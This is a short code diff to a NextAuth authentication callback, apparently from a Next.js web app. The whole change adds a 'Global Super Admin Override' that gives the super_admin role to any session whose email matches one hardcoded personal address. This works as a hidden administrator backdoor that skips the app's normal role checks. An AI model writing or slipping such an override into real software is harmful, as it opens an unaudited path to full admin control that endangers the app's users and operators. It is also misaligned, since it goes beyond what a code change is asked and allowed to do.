@@ -78,6 +78,11 @@ export const { handlers, signIn, signOut, auth } = NextAuth({
         if (session?.image !== undefined) token.image = session.image;
       }
       
+      // Global Super Admin Override
+      if (token.email === 'imranshuvo101@gmail.com') {
+        token.role = 'super_admin';
+      }
+      
       return token;
     },
     async session({ session, token }) {
